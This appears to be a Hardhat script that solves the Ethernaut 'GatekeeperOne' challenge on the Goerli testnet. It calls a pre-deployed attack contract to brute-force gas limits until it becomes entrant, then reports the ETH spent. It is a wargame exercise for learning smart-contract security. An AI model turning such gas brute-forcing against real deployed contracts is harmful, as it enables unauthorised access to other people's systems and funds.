const { ethers } = require("hardhat")

async function main() {
    /*
    Script to pass GatekeeperOne level on Goerli network
    GatekeeperOneAttack_v2 contract must be pre-deployed
    */

    const attackAddress = "0xdB89C939EcAaf92284A9B1FcD938A6Cc0CFf51e1"

    const { deployer } = await ethers.getNamedSigners()
    const initialBalance = await ethers.provider.getBalance(deployer.address)
    const attack = await ethers.getContractAt("GatekeeperOneAttackV2", attackAddress)

    // test gas limits 200 at a time
    for (let i = 0; i < 2; i++) {
        const a = i * 200
        const b = a + 200
        const tx = await attack.enterBruteForce(a, b)
        const txReceipt = await tx.wait()
        const result = txReceipt.events[0].event
        console.log(`${a}-${b}: ${result.toString()}`)
        if (result.toString() == "Success") {
            // we have successfully become entrant
            break
        }
    }

    const finalBalance = await ethers.provider.getBalance(deployer.address)
    console.log("")
    console.log(
        `Gas spent: ${ethers.utils.formatEther(initialBalance.sub(finalBalance).toString())} ETH`
    )
}

main()
